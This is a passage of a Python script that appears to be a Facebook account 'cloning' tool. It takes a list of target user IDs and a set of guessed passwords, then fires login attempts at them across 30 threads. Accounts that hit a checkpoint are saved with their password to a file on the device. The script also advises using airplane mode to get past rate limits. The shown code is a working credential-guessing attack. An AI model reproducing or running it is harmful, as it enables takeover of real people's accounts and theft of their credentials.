break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [FMZ-999-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/FMZ-999_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
           
    def pasw(self):       
            pw = []
            clear()
            print('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \033[38;5;46mHow many passwords do you want to add')
            sl = int(input('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\033[38;5;46mPut Limit \x1b[1;97m●  '))
            if sl =='':
                print('\n\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\033[38;5;46mPut limit between 1 to 30')
            elif sl > 20:
                print('\n\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;196mPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\033[38;5;46mPut Password {sr+1}\x1b[1;97m ●  '))
            os.system("clear")
            print(logo)
            print(f' TOTAL IDS FOR CLONE  :\033[38;5;46m %s ' % len(self.id))
            print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            print("\x1b[38;5;46mUse Airplane Mode More  OK IDS")
            from datetime import datetime
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            print("\x1b[38;5;46mCloneing Start Time \x1b[1;97m●\x1b[38;5;46m ", current_time)
            print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with GsASIF(max_workers=30) as ASIFgift:
              for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                ASIFgift.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                ASIFgift.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                ASIFgift.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                ASIFgift.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   

menu()